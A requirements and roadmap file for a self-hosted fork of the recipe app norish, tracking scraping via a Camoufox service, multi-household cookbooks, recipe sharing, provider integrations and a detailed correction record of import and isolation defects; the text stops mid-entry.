# Requirements: norish (Kiran's fork)

**Defined:** 2026-06-12
**Core Value:** Reliable recipe import & management for Kiran's groups, incl. bot-protected sources, with no extra setup vs upstream.

## v1 Requirements

### Scraping (native Camoufox) — Phase 1

- [x] **SCRAPE-01**: Recipe page fetching uses the Camoufox REST service (LXC 105) natively, configured via `CAMOFOX_URL`.
- [x] **SCRAPE-02**: Headless-Chrome dependency removed from the app + docker compose (no `chrome-headless` service required).
- [x] **SCRAPE-03**: Per-site cookie/header auth tokens are still applied through Camoufox.
- [x] **SCRAPE-04**: Bot-protected sources (e.g. ah.nl) import successfully end-to-end.
- [x] **SCRAPE-05**: No boot-time bundle patch needed — Camoufox support ships in the built image.
- [x] **SCRAPE-06**: Graceful behavior when Camoufox is unreachable (clear error, no silent empty extraction).

### Households / cookbooks — Phase 2

- [x] **HOUSE-01**: A user can belong to multiple households simultaneously.
- [x] **HOUSE-02**: A user can create, join (by code), and leave multiple households. _(backend complete; UI gap RESOLVED in 02-05 — create-another / join-by-code now reachable any time from the navbar switcher's "Create or join a cookbook" modal; CKBK-UI-01 done)_
- [x] **HOUSE-03**: A user can switch their active household/cookbook.
- [x] **HOUSE-04**: Recipes are scoped to a household/cookbook (`recipes.household_id`); `null` = personal.
- [x] **HOUSE-05**: A personal cookbook coexists with shared cookbooks for the same user.
- [x] **HOUSE-06**: Per-cookbook isolation — members of one household cannot see another household's recipes (security-critical).
- [x] **HOUSE-07**: Import/create assigns the recipe to the active cookbook. _(backend 02-02; frontend 02-04 indicates the active-cookbook target + refetches the list on switch — v1 shows the active target, no manual picker; code-complete, human-verify pending)_

### Recipe sharing — Phase 4

- [x] **SHARE-01**: Per-link recipe sharing with per-recipe visibility private/household/public (built ON the existing `recipe_shares`); public = no-auth read-only view of ONE recipe by long share token at `/share/<token>`; gated on `visibility = public` (private/household unreachable publicly); owner/cookbook-admin creates/revokes the link + sets visibility from the recipe page. No public gallery (deferred). _(code-complete 2026-06-14; human-verify pending)_

### Video transcription (AssemblyAI) — Phase 5

_(renumbered from Phase 3/4 to make room for the Sharing phase.)_

- [x] **VIDEO-01**: AssemblyAI is a selectable native transcription provider (config-driven key). _(code-complete 2026-06-14, 04-01; key set in the admin UI -> video_config.transcriptionApiKey; native upload->poll dispatch; human-verify with the lead pending)_
- [ ] **VIDEO-02**: TikTok & Instagram video imports work (caption + transcription).
- [ ] **VIDEO-03**: Video description/caption is used in extraction (already upstream — verify retained).
- [ ] **VIDEO-04**: No boot-time patch for transcription — ships in the built image.

### AI / LLM provider (DeepSeek) — Phase 6

- [x] **AI-01**: DeepSeek is a selectable AI/LLM (recipe-extraction) provider with the V4 models `deepseek-v4-pro` + `deepseek-v4-flash` selectable in the admin AI-config; the API key is read from the admin AI-config secret at runtime (SETUP-05; no env, no boot-patch). _(code-complete 2026-06-14, 06-01; the provider was already wired from upstream — this surfaced the two V4 model ids in the model picker + added unit coverage; human-verify with the lead pending)_

### Setup / maintainability — Phase 0 / cross-cutting

- [ ] **SETUP-01**: Fork builds via `pnpm docker:build` on LXC 110 and deploys to the existing stack.
- [ ] **SETUP-02**: Diff vs upstream is minimal + isolated; upstream remote tracked.
- [ ] **SETUP-03**: No extra runtime setup vs off-the-shelf norish (config/env only).
- [x] **SETUP-04**: Camoufox is bundled in the compose (self-contained) by building the **vendored camofox-browser v1.4.1** source under `docker/camofox/` (no external image/registry — the published 1.8-1.11 images regressed on Akamai); no external browser service required; `CAMOFOX_URL` can override to reuse an external one. Done in `docker-compose.example.yml` since Phase 1; the fork-specific gap (the untracked LIVE compose lacked it) closed 2026-07-28 by plan 27.1-04 (`docker/docker-compose.fork.yml`, `docker/docker-compose.beta.yml`).
- [ ] **SETUP-05**: All cloud API keys (AI provider, transcription/AssemblyAI, OAuth) are configurable via the admin UI and persisted (encrypted) in the DB — not required as environment variables.

## v2 Requirements

- ~~**HOUSE-08**~~: Per-cookbook permission policy / move-recipe-between-cookbooks. **Both halves are now scheduled**: the policy half shipped as POLICY-01 (Phase 3); the move half is CKBK-MOVE-01 (Phase 23), raised independently by the 2026-07-21 UAT (B3).
- **VIDEO-05**: Dedicated TikTok processor (caption-first hardening).

## Out of Scope

| Feature | Reason |
|---------|--------|
| Mobile app changes | Web is the target |
| Recipe parser/AI rewrite | Works; only fetch layer changes |
| Locale changes | Already NL+EN upstream |

## Traceability

| Requirement | Phase | Status |
|-------------|-------|--------|
| SCRAPE-01..06 | Phase 1 | Pending |
| HOUSE-01..07 | Phase 2 | HOUSE-01..07 done; frontend (switcher, active-cookbook import indication, refetch-on-switch, 11-locale i18n) landed in 02-04 — code-complete, human-verify pending with the lead |
| SHARE-01 | Phase 4 | Code-complete 2026-06-14, human-verify pending |
| VIDEO-01..04 | Phase 5 | VIDEO-01 code-complete 2026-06-14 (04-01); VIDEO-02..04 folded into the human-verify / retained |
| AI-01 | Phase 6 | Code-complete 2026-06-14 (06-01); DeepSeek provider already upstream, V4 model ids surfaced + tested; human-verify pending |
| SETUP-01..03 | Phase 0 | In progress |
| SETUP-04 | Phase 1 | Done |
| SETUP-05 | Phases 1/3 + cross-cutting | In progress |
| UPSTREAM-019 | Phase 20 | Complete |
| MEDIA-UX-01 | Phase 21 | Pending — raised by the 2026-07-21 UAT (A3) |
| UI-POLISH-01 | Phase 21 | Pending — raised by the 2026-07-21 UAT (D) |
| REALTIME-ISO-01 | Phase 22 | Pending — BUG, confirmed against live 2026-07-21 |
| CKBK-MOVE-01 | Phase 23 | Pending — raised by the 2026-07-21 UAT (B3) |
| BULK-01 | Phase 24 | Pending — promoted from backlog 2026-07-21 |
| IMPORT-UX-01 | Phase 24 | Pending — raised by the 2026-07-21 UAT (B2) |
| SHOP-01 | Phase 25 | Pending — promoted from backlog 2026-07-21 |
| SHOP-02 | Phase 25 | Pending — DECIDED 2026-07-21 (household-scoped lists) |
| DINNER-01 | Phase 26 | Pending — promoted from backlog 2026-07-21 |
| COOK-01 | Phase 27 | Pending — externally blocked on upstream #470 design |
| IMPORT-REL-01..05 | Phase 27.1 | IMPORT-REL-01/02 DONE 2026-07-28 (plan 27.1-01); IMPORT-REL-03 DONE 2026-07-28 (plan 27.1-02); IMPORT-REL-04 DONE 2026-07-28 (plan 27.1-03); IMPORT-REL-05 DONE 2026-07-28 (plan 27.1-04, repo artifact — live adoption deliberately deferred); all 5 requirements now DONE; only the post-deploy empirical gate (plan 27.1-05) remains (6 plans, 3 waves) |
| PENDING-ISO-01 | Phase 27.1 | DONE 2026-07-28 (plan 27.1-06) — `everyone` folds into the household clamp; RED-first + adversarial re-verification, see `27.1-06-SUMMARY.md` |
| IMPORT-SANITIZE-01, IMPORT-OBS-01 | Phase 27.2 | Pending — NOT STARTED. Raised 2026-07-28 by the five-agent diagnostic sweep that established the REAL import root cause (the upstream sanitizer), superseding 27.1's. Also carries F-2. |
| GATE-01, I18N-01 | Phase 27.3 | Pending — NOT STARTED. Closes F-9. 6 of 17 packages do not typecheck; `pnpm i18n:check` has exited 1 on every PR and every push to `main`. |
| COOKPOOL-01, PENDING-ISO-02, ACCT-DEL-01, SW-CACHE-01, OPS-01 | Phase 27.4 | Pending — NOT STARTED. Closes F-5, F-11, F-12, F-13, F-14, F-15, F-18, F-21. PENDING-ISO-02 is security-critical (HOUSE-06 family); ACCT-DEL-01 is live data loss. |
| DEADCODE-01 | Phase 27.5 | Pending — NOT STARTED. Executes the three `27.1-REVIEW-{A,B,C}` reports (~3 300 lines at HIGH confidence), including their three recorded false-positive traps. |
| COOK-02 | Phase 27.6 | Pending — NOT PLANNABLE until its hard prerequisites are discharged. The real W6; completes COOK-01. Hard-blocked on Phases 27.2/27.3/27.4 **and on F-19** (0.000-confidence live derives). |
| COST-01 | Phase 28 | Pending — promoted from backlog 2026-07-21 |
| MAKE-01 | Phase 29 | Pending — promoted from backlog 2026-07-21 |
| VERSION-01 | Phase 30 | Pending — unblocked by SHARE-02 shipping 2026-07-21 |

**Coverage:** v1 = 22 requirements, all mapped to phases. The 2026-07-21 roadmap extension adds 11 more (Phases 22–30), promoting the previously vault-only product backlog into sequenced phases. The **2026-07-28 correction pass** adds 11 more again (Phases 27.2–27.6: IMPORT-SANITIZE-01, IMPORT-OBS-01, GATE-01, I18N-01, COOKPOOL-01, PENDING-ISO-02, ACCT-DEL-01, SW-CACHE-01, OPS-01, DEADCODE-01, COOK-02) — these were **not** promoted from the backlog; they are defects found on the live stack, defined in "Correction & remediation — Phases 27.2–27.6" below. Still unscheduled by design (open product decisions, not capacity): INVITE-02, RATE-02, REC-01, DISCOVER-01.

## Backlog / future phases

Locked from the product backlog + brainstorm (2026-06-12). All **Backlog/v2** unless a near-term marker is given. The rich version lives in Kiran's Obsidian vault; this is the concise canonical mirror.

### Near-term (candidate next phases)

- [x] **POLICY-01** (Phase 3, 03-01) — DONE 2026-06-14 (code-complete; human-verify pending): Per-household permission policies — each cookbook sets its own view/edit/delete via 3 `permission_level` enum columns on `households` (+ migration 0037, backfilled from the server-wide policy). `canAccessResource` resolves per-cookbook from the recipe's OWN household; `edit`/`delete = household` => recipe owner OR cookbook admin (admin-edits-any / members-edit-own). `buildViewPolicyCondition` reads the active cookbook's `view_policy`; an active cookbook never widens cross-cookbook (HOUSE-06 intact, adversarially verified). DISALLOWS per-cookbook `view = everyone` (only the global default may be everyone); the server-wide policy is demoted to the default for new cookbooks + the personal-recipe fallback. Admin-only Recipe Permissions card on the Household settings page + i18n in all 11 locales.
- [x] **INVITE-01** (Phase 2, 02-06) — DONE 2026-06-13: shareable, regenerable **invite link** (`/join/<token>`) alongside the short join code. `households.invite_token` (+ migration 0036); admin generate/regenerate; a PUBLIC name-only `getByInviteToken` lookup; a `joinByInviteToken` mutation reusing the multi-membership join path; an admin invite-link UI in Household settings + the public `/join/[token]` page (logged-out → login → return); i18n in all 11 locales. SAME security model as the join code; **registration-bypass is explicitly DEFERRED as INVITE-02** (a separate decision). (code-complete; folded into the 02-06 human-verify)
- **INVITE-02** (Backlog/v2, deferred from 02-06): invite-link-as-**registration bypass** — let a logged-out invitee sign up via `/join/<token>` even when `registration_enabled` is off (a scoped, token-gated registration). v1 keeps the existing signup flow + `registration_enabled`.
- [x] **CKBK-UI-01** (Phase 2 fix) — DONE 2026-06-13 (02-05): create-another + join-by-code are reachable any time via the navbar switcher's "Create or join a cookbook" modal (the same forms NoHouseholdView used, now sourced from the global household context). No longer blocks HOUSE-02.
- [x] **RENAME-01** (user-requested 2026-06-13) — DONE 2026-06-13 (02-05): `households.rename` mutation (admin-only, optimistic-version) + an admin inline-rename on the Household settings page (household-info-card), surfaced through the global household context.

### Sharing & ratings — Backlog

- [x] **SHARE-01** (Phase 4, SHARE-01) — DONE 2026-06-14 (code-complete; human-verify pending): Per-link sharing with per-recipe visibility private/household/public, built ON the existing `recipe_shares` feature. Added `recipes.visibility` enum + migration 0038; the no-auth `/share/<token>` route serves a recipe ONLY when `visibility = public` (private/household unreachable even with a valid token — adversarially verified); creating a link promotes to public, revoking the last one reverts to private; an editor (owner/cookbook admin per POLICY-01) sets visibility from the recipe Share panel; token standardized to crypto.randomBytes(32). Public payload is single-recipe display data only (no ids/owner/cookbook listing). No public gallery (deferred); SHARE-02 deferred.
- [x] **SHARE-02** — DONE (shipped 2026-07-21): "Save to account" button on a shared/public recipe → prompt login if needed → copy the recipe into the user's active cookbook. Backed by the `saveShared` authed procedure (`packages/trpc/src/routers/recipes/shares.ts:376`) and `ShareSaveButton`, rendered on both the desktop (`app/share/[token]/page.tsx`) and mobile (`shared-recipe-page-mobile.tsx`) public views. **History worth keeping**: the button was silently orphaned by the v0.19.0 merge — the component survived but both render sites were dropped, so the feature was dead code until the 2026-07-21 UAT (B4) caught it and commit `0a52ade1` restored it. Same "silent partial completion" failure class the 20-04 review caught on `timer-dock.tsx`. **Unblocks VERSION-01** (Phase 30), which needs a save event to hang lineage off.
- [x] **RATE-01** (Phase 4, RATE-01) — DONE 2026-06-14 (code-complete; human-verify pending): On the AUTHENTICATED recipe detail page (desktop + mobile), show a recipe's **average + count** and a per-user **"rated by <name> ★★★★"** list, built ON the existing per-user `recipe_ratings` feature (table + repo + ratings router + StarRating UI + the useRatingQuery that already returns averageRating/ratingCount, + the dashboard card that already shows averageRating via the DTO). Added: `getRecipeRaters` repo join (decrypted display names, null-safe) + `RecipeRaters{,Schema}` shared zod + a NEW `ratings.getRaters` authedProcedure that runs `assertRecipeAccess(view)` FIRST (a user outside the recipe's OWN cookbook gets FORBIDDEN and the names are never fetched — HOUSE-06/POLICY-01; adversarially verified) + a read-only `RecipeRaters` component (current user labelled "You", null-name fallback) in both detail pages' rating section + i18n in all 11 locales. NO schema change/migration. **Public-share-view ratings are DEFERRED as RATE-02** (privacy decision — exposing member names on the no-auth /share view). (code-complete; human-verify with the lead pending)
- **RATE-02** (Backlog/v2, deferred from RATE-01 — privacy decision for Kiran): show ratings + rater **names** on the no-auth `/share/<token>` public view. Exposing cookbook member names to anonymous visitors is a privacy call; RATE-01 kept ratings authenticated-views-only and left the public surface (sharedRecipeProcedure + PublicRecipeViewSchema) untouched. Confirm the privacy stance (e.g. names vs. anonymized stars, opt-in) before building.
- **VERSION-01** (major): Shared-recipe **versions / lineage** — saving a shared recipe creates a version in a shared bucket; users can explore others' versions; reviews aggregate across versions but stay **attributed to the version**; rater names visible. (Phase 2's recipe-1:N-cookbook model stays forward-compatible via a future `lineage_id` / `parent_recipe_id`.)

### Cooking, cost & discovery — Backlog (major)

- **COOK-01** (major): Migrate to **Cooklang** — aligned with upstream issue #470, built so it is contributable as the PR that closes it (coordinate design with the maintainer). Delivers in-step ingredient quantities + multi-timer cooking mode. Parser `@cooklang/cooklang` (WASM); requires a structured→`.cook` serializer for the importer; map dual-unit / nutrition / media into Cooklang metadata.
- **COST-01** (major): Cost-per-recipe **€/€€/€€€** badge — daily index pull from `supermarkt/checkjebon` (MIT, 12 NL chains) → Postgres; Camoufox AH scrape for cache-miss + Bonus/deals; LLM ingredient parse (Dutch) + fuzzy match; per-serving bucket; **async**. Do not redistribute scraped AH data.
- **MAKE-01** (major): "What can I make now" — **image (+ optional text) input** → AI ingredient recognition → makeable recipes (+ what's missing). **No pantry.** Seed reference: Albert Heijn GenAI (https://nieuws.ah.nl/albert-heijn-zet-volgende-stappen-in-generative-ai/). Deep research deferred to build-time.
- **SHOP-01** (major): Smart shopping list with **aisle / category grouping** (Tandoor model: food→category, store→ordered categories; seed from open-tandoor-data), generated from recipes / meal-plan. Decoupled from any pantry. Deals optional / later.
- **DINNER-01**: What's-for-dinner suggester (season + latest ratings; show rater avatar + stars + thought-bubble).
- **BULK-01**: Bulk import (multiple URLs, or a whole blog).
- **REC-01** (v2): Recommendations ("recipes others liked, similar to this") — content-based first, collaborative as ratings grow.
- **DISCOVER-01** (v2 / potential): Public cookbook discovery.

### Import reliability — Phase 27.1 (from the 2026-07-28 live investigation)

> **⚠ CORRECTION 2026-07-28 (later the same day) — THE ROOT CAUSE RECORDED IN THIS SECTION IS
> SUPERSEDED. Read this before acting on anything below it.** The paragraph and the IMPORT-REL-01 /
> IMPORT-REL-02 entries that follow are preserved as the historical record, **not** as current truth.
> Five independent diagnostic agents established the real cause: `extractSanitizedBody`
> (`packages/shared-server/src/ai/helpers.ts:93`) harvests page text only from
> `h2,h3,h4,h5,h6,p,li,dt,dd,figcaption`, so a Blogger page — recipe as bare text nodes separated by
> `<br>` inside `div.post-body`, zero `<p>`, zero `<li>` — hands the model 86–585 characters of
> navigation chrome. The prompt's *"Return {} if data cannot be extracted"* rule then makes `{}` the
> **correct** model output. **24 of the 25 live AI failures are this**; the 25th is reasoning-token
> exhaustion. Failures are **not** intermittent-with-three-sub-causes; they are deterministic per page
> shape. Now owned by **IMPORT-SANITIZE-01 (Phase 27.2)** — see `ROADMAP.md` Phase 27.2.
> **These five requirements are still `[x]` DONE as *code***, and IMPORT-REL-03/04/05 and
> PENDING-ISO-01 stand on their own merits — but **the live import failures they read as fixing were
> NOT fixed**. Do not treat this section's `[x]` marks as evidence that import works.

Root cause established empirically against the LIVE stack by three independent agents and recorded as
locked decisions in `.planning/phases/27.1-.../27.1-CONTEXT.md`. Import failures are **INTERMITTENT** —
six over ~72 h, interleaved with successes on the very same URLs — from three sub-causes, compounded by
two UX defects that make a failure look like nothing happened. _(SUPERSEDED 2026-07-28 — see the
correction banner directly above.)_

- [x] **IMPORT-REL-01** (Phase 27.1, plan 27.1-01) — DONE 2026-07-28: AI extraction output is accepted on
  `name` + metric ingredients + metric instructions; a missing measurement half is MIRRORED, never a
  rejection. `validateExtractionOutput` (`packages/api/src/ai/features/recipe-extraction/normalizer.ts`)
  no longer hard-rejects when the model emits no US half — `mirrorMeasurementSystems` mirrors the absent
  half at all three extraction call sites (recipe-parser, image-recipe-parser, video/normalizer) before
  validate/normalize/buildCookFromExtraction. A logged failure carrying `metricIngredients: 10,
  usIngredients: 0` now imports instead of being thrown away as `VALIDATION_ERROR`.
  **CORRECTION 2026-07-28: this is correct code on an UNREACHABLE path.** `Output.object` validates
  inside `generateText` and throws *before* `mirrorMeasurementSystems` / `validateExtractionOutput` ever
  run. The live logs prove it — the error string is always "AI response did not match expected format.",
  **never** "Recipe extraction failed - missing required fields". It fixed **0 of the 25** live failures.
  Kept (it is not wrong, and it becomes reachable if the schema is ever relaxed), but it closes nothing.
- [x] **IMPORT-REL-02** (Phase 27.1, plan 27.1-01) — DONE 2026-07-28: A transient AI extraction failure is
  retried EXACTLY ONCE, and the retry runs with raised output-token headroom.
  `packages/api/src/parser/index.ts`'s `tryExtractWithAI` now makes at most two attempts, gated on a
  closed `RETRYABLE_AI_EXTRACTION_CODES` set (excludes `AI_DISABLED`/`AUTH_ERROR`/`INVALID_INPUT`).
  ~~`defaults.ts` stays untouched (inert on live)~~; the retry passes `extractRecipeWithAI` an
  `outputTokenFloor` of `AI_RETRY_OUTPUT_TOKEN_FLOOR = Math.min(100_000, 393_216) = 100_000` (measured
  DeepSeek ceiling), which the callee applies as `Math.max(configured, floor)` — never lowering a
  configured value, never touching the first attempt.
  **CORRECTION 2026-07-28 (two parts).** (a) **"`defaults.ts` stays untouched (inert on live)" is
  WRONG about *why*.** `defaults.ts` genuinely was not edited, but the "inert on live" reasoning does
  not hold: the LIVE `maxTokens` comes from the DB `ai_config` row, and that row is **also 10000** —
  the same starving value, actively in force. `ROADMAP.md:698-704` (F-2, now owned by Phase 27.2)
  carries the corrected finding: `deepseek-v4-pro` spends 9 000–10 000 tokens on reasoning before
  emitting output, so at 10 000 a 10–11-ingredient recipe cannot fit (`finish_reason:"length"`, empty
  content) while a 6-ingredient one can. **27.2 raises the DB row above the measured ~11k floor and
  aligns `defaults.ts` for fresh installs.** (b) **The retry raises a budget that was never the
  constraint** for 24 of the 25 failures: the same sanitizer-starved page at 100 000 output tokens
  still returns `{}` in 3 s with `finish_reason: stop`. The retry is real and it is kept — it fixed
  **exactly 1 of 25** (wiswijzer/erwtensoep, genuine reasoning-token exhaustion).
- [x] **IMPORT-REL-03** (Phase 27.1, plan 27.1-02) — DONE 2026-07-28: After AI extraction has FINALLY
  failed, a page carrying valid schema.org Recipe JSON-LD still imports, through the same normalizer /
  `createRecipeWithRefs` / cook-projection path, minting a scored `.cook` through the sanctioned
  `buildCookPayload`. **AI stays PRIMARY** — `tryJsonLdFallback` (`packages/api/src/parser/jsonld-fallback.ts`)
  is called ONLY at `parseRecipeFromUrl`'s two AI-failure exits; proven by tests asserting zero fallback
  calls whenever any AI attempt succeeds. Reuses W5's `buildStructuredRecipeFromLegacy` (widened to a
  structural `LegacyProjectionSource` type) + `cookConfidenceFromLinks`, gated at
  `COOK_REVIEW_CONFIDENCE_THRESHOLD` (0.800, strict `<`); below the gate, `cook_source` stays NULL,
  byte-identical to today's python-scraper degradation. `LEGACY_RECIPE_PARSER_ROLLBACK`'s semantics are
  NOT resurrected — the fallback reads no env flag. Every terminal parse path logs one `parserPath`
  marker (`ai` / `jsonld-fallback` / `structured`) for 27.1-05's post-deploy gate.
- [x] **IMPORT-REL-04** (Phase 27.1, plan 27.1-03) — DONE 2026-07-28: An import failure ALWAYS reaches the
  user as a visible, rendered, dismissible error card — never an eternal skeleton — and never crosses a
  cookbook boundary. `handleJobFailed` (`packages/queue/src/recipe-import/worker.ts`) rewritten:
  the `failed` emit now happens BEFORE `deleteRecipeImagesDir`/`resolveHouseholdRealtimeScope`, each step
  independently guarded, and the whole handler wrapped so it can never reject
  (`lazy-worker-manager.ts:259-263` only logs an `onFailed` rejection — exactly how the event used to be
  swallowed). A rejecting resolver fails closed to `owner` scope against the job's own actor context,
  never widening; a healthy resolution keeps `importStarted`'s household scope, so the event that
  removes a shared-cookbook skeleton reaches the same audience. Security-critical: proven under the live
  `view: "everyone"` policy with an `everyone` sibling case (`describe.each`), and adversarially verified
  — temporarily routed `everyone` to `emitter.broadcast()`, confirmed 5 tests across 3 isolation suites
  went RED, reverted byte-identical (sha256-confirmed). Client-side, a `FailedImportCard` (new) replaces
  the skeleton in `recipe-grid.tsx` for a failed id, driven by a new client-only `failedImports` cache
  (mirrors the existing `importStages` cache pattern); `onFailed` records the failure BEFORE removing the
  pending entry so an id is never simultaneously neither-pending-nor-failed; a successful retry clears a
  stale card via `onImported`/`onCreated`. New strings in all 12 locales.
- [x] **IMPORT-REL-05** (Phase 27.1, plan 27.1-04) — DONE 2026-07-28 (repo artifact; live adoption
  deliberately NOT performed): Camoufox is defined as an IN-STACK service in a repo-tracked fork
  compose (`docker/docker-compose.fork.yml`, new), built from the vendored `docker/camofox` source
  (SETUP-04), with `CAMOFOX_URL: ${CAMOFOX_URL:-http://camofox:9377}` retained as an explicit override
  and `norish` gated on `camofox`'s healthcheck via `depends_on: condition: service_healthy`. Live had
  NO camofox service: `norish-app` on `norish_default`, `norishp2-camofox-1` on `norishp2_default` and
  unreachable from it, working only because `CAMOFOX_URL` pointed off-stack at LXC 105 — an
  undocumented single point of failure. The Camoufox service itself was HEALTHY; the defect was
  topology. Finding F-3 fixed alongside it: `docker-compose.beta.yml` no longer defaults
  `CAMOFOX_URL` to the off-stack address either — beta gets its own in-stack `camofox` on the
  isolated `norish-beta` network. **The live compose is outside the repo tree**; this plan shipped the
  repo artifact plus `tooling/fork-stack/README.md` (the adoption / reachability-proof / rollback
  runbook) and did NOT mutate live — no live container, network, or volume was touched. See
  `27.1-04-SUMMARY.md`.

**Gate:** a non-skippable POST-DEPLOY EMPIRICAL GATE (plan 27.1-05) — the mandated ah.nl URL, then >= 10
further ah.nl recipes across >= 6 categories, then >= 5 lekkerensimpel recipes, each evidenced with
fetch, JSON-LD, path taken, per-system ingredient counts, `cook_source` and any failure VERBATIM.
**CORRECTION 2026-07-28: this gate ran 24/24 GREEN and proved nothing about this phase.** Every one of
the 24 source pages ships valid JSON-LD, so every import logged `parserPath:"structured"`,
`usedAI:false` — certifying the structured path, which 27.1 never modified. The AI path, the retry and
the JSON-LD-after-AI-failure fallback were **not exercised live**. Any future import gate MUST include
non-JSON-LD pages: `tooling/import-gate/urls.blogspot.txt` is that set (Phase 27.2's acceptance gate).

- [x] **PENDING-ISO-01** (Phase 27.1, plan **27.1-06**) — **DONE 2026-07-28.** **SECURITY, was live.** `recipes.getPending` (`packages/trpc/src/routers/recipes/pending.ts`) used to return `true`
  for EVERY queued import job when `policy.view === "everyone"` — the live server-wide value — so every
  authenticated user was served every household's pending imports, `recipeId` **and** source `url`
  included. This is the fourth member of the family AGENTS.md documents (REALTIME-ISO-01,
  IMPORT-DEDUP-ISO-01, LIST-ISO-01): a code path reading `everyone` as *unscoped* rather than clamping
  it to the cookbook. Pre-existing and independent of 27.1, whose new `failed` event travels the
  cookbook-clamped `emitByPolicy` path. The planner deferred it as outside the briefed five-item scope;
  **the director OVERRODE that deferral on 2026-07-28** — per-cookbook isolation is a CLAUDE.md hard
  constraint that outranks a scope preference, and shipping 27.1 with a known import-surface leak would
  be indefensible. Fix (commit `fee14975`): `everyone` loses its branch entirely and falls through to the
  same `job.data.householdKey === ctx.householdKey` clamp `household` uses, mirroring `emitByPolicy`
  (D-22-01) and `buildViewPolicyCondition` (LIST-ISO-01) rather than inventing a fourth shape. No
  server-admin exemption introduced. Proven by a two-household suite (`pending-isolation.test.ts`)
  written RED first, asserting on the disclosive `url` rather than a count, running every case under
  `household` / `everyone` / `owner`, and re-verified adversarially (weakening restored → confirmed RED →
  reverted byte-identical, SHA-256 checksum matched). `pnpm --filter @norish/trpc test` 337 → 371 (34
  new), 0 failed. See `27.1-06-SUMMARY.md`.

- **F-5** (raised 2026-07-28 while planning 27.1-06, **NOT scheduled**) — the four `is*` job probes in
  the same file (`isNutritionEstimating` :58-74, `isAutoTagging` :102-118, `isAutoCategorizing` :120-136,
  `isAllergyDetecting` :166-182) answer `jobs.some(j => j.data.recipeId === input.recipeId)` with NO
  ownership check, so any authenticated caller can probe an arbitrary recipe id. The
  "Authenticating is not authorizing" pattern from AGENTS.md. Materially lower severity than
  PENDING-ISO-01 — a boolean about an id the caller must already hold — and both sources that handed out
  other cookbooks' ids (`getPending`, the pre-D-22-01 broadcast) are now closed. Needs its own decision.

### Correction & remediation — Phases 27.2–27.6 (from the 2026-07-28 five-agent diagnostic sweep)

These 11 requirements are **not** promoted backlog items. Every one is a defect established against the
LIVE stack on 2026-07-28, after Phase 27.1 had already deployed on a root cause that turned out to be
wrong. Five decimal phases carry them, in dependency order (27.2 → 27.3 → 27.4 → 27.5 → 27.6); the
rationale for that order is in `ROADMAP.md` "Sequencing rationale (Phases 27.2–27.6)". The findings
register they close (F-2, F-5, F-9, F-11..F-21) lives in `ROADMAP.md`'s follow-ups register.

- [ ] **IMPORT-SANITIZE-01** (Phase 27.2) — **The page sanitizer must recover the recipe from pages
  with no semantic block markup.** `extractSanitizedBody`
  (`packages/shared-server/src/ai/helpers.ts:93`) harvests text only from
  `h2,h3,h4,h5,h6,p,li,dt,dd,figcaption`. Classic Blogger pages put the whole recipe in bare text nodes
  separated by `<br>` inside `div.post-body` — zero `<p>`, zero `<li>` — so the model receives 86–585
  characters of navigation chrome, correctly returns `{}` per the DB base prompt's *"Return {} if data
  cannot be extracted"* rule, and the user sees "AI response did not match expected format."
  **24 of the 25 live AI failures are this** (susannekookt/kwarkbol: 107 sanitized chars against a
  2 760-char recipe; restoring the post-body text and re-running the *identical* prompt produced a valid
  11-ingredient extraction; 7/7 correlation — the only two pages that succeeded live are the only two
  whose post-body contains `<li>`). Three things must be true: (1) `<br>`-separated text nodes **and**
  table cells are captured; (2) a real article-body container (`.post-body`, `[itemprop=articleBody]`,
  `article`) is preferred over `<main>`; (3) **when the selector pass yields implausibly little relative
  to the root's own text length, fall back to the whole-root text** — that last clause is the general
  fix, because the selector list will always miss some site, and without it this requirement just moves
  the next failure to the next unlisted markup shape. `helpers.ts` is **byte-identical to
  `upstream/main`** — an UPSTREAM defect, not a fork regression: keep the diff minimal and isolated so
  the fix is offerable upstream as-is (CLAUDE.md: "consider upstreaming features").
- [ ] **IMPORT-OBS-01** (Phase 27.2) — **A starved sanitizer must be visible in the live logs as a
  parser bug, not read as "no recipe here".** Sanitized content length must be logged at the level the
  live stack actually emits (`info`, alongside "Starting AI recipe extraction") — the EXISTING debug
  line at `packages/api/src/ai/recipe-parser.ts:105` never fires on live, so raising a level is not
  enough — and a large page yielding a tiny sanitized body must **warn loudly** as a distinct
  parser-bug signature. Nothing in the logs distinguished "the model saw the recipe and declined" from
  "the model was handed nav chrome", which is the single reason IMPORT-SANITIZE-01 cost a week instead
  of an hour. Also in scope: the lying `parserPath` marker at `packages/api/src/parser/index.ts:353`,
  which fires from `:454` even when AI was never invoked (the `:432` guard is
  `aiEnabled && await isPageLikelyRecipe(html)`), and the false `reason` default at `:458`
  (`structured-and-ai-failed`).
- [ ] **GATE-01** (Phase 27.3) — **Every package must genuinely typecheck, and every build assertion
  must cover every bundler that ships the code.** No `--noCheck` in any `typecheck` script and no
  `"noCheck": true` in any `tsconfig.json`. **6 of 17 packages do not typecheck today:** script-level
  `--noCheck` in `packages/api:15`, `packages/auth:16`, `packages/queue:17`, `packages/shared-server:57`
  and `packages/trpc:49` (trpc's is not even `--noEmit` — it is byte-identical to its own `build`
  script, so `pnpm typecheck` **deletes trpc's build output** and checks nothing), plus
  `apps/web/tsconfig.json:6` `"noCheck": true` hiding **285 real errors** behind a script that reads as
  an honest `tsc --noEmit` (true since `bb003e9a`, 2026-03-11). Two of those 285 are live hazards, not
  cosmetics: `create-or-join-cookbook-modal.tsx` imports three non-existent `@heroui/react` members
  (would throw on render) and `lib/recipe-media.ts:180` reads `user.isServerAdmin` off a type that does
  not declare it — on an **authorization** path. `@norish/shared/contracts` additionally ships 17 broken
  type imports hidden by `skipLibCheck`, collapsing `Slot` to `any` at four live call sites. **The build
  half is equally load-bearing:** `apps/web/tsdown.config.ts:44-55` asserts the Cooklang parse worker
  was emitted, and stayed green throughout the entire period the pool was broken in the Next.js/
  Turbopack chunks (F-11) — an assertion covering one of two bundlers is the same class of lie as
  `--noCheck`. Proof obligation: a deliberately planted type error must turn `pnpm typecheck` RED
  (plant it, prove it, revert). Prior art to follow: `.planning/quick/typecheck-gate-restore.md`.
- [ ] **I18N-01** (Phase 27.3, closes F-9) — **`pnpm i18n:check` must exit 0.** It exits 1 today: locale
  `no` is missing 68 keys. `.github/workflows/pr-quality.yml:46` runs it on every PR **and** every push
  to `main`, so that job has been **red continuously** — a permanently-red gate is an ignored gate.
  Proven pre-existing (base state reconstructed from `a1e51a7c`; 0 keys introduced by Phase 27.1). In
  the same pass, remove the 136 orphan `settings.admin.*` leaf keys × 12 locales left behind when the
  fork deleted upstream's admin forms.
- [ ] **COOKPOOL-01** (Phase 27.4, closes F-11) — **The Cooklang parse pool must resolve its child
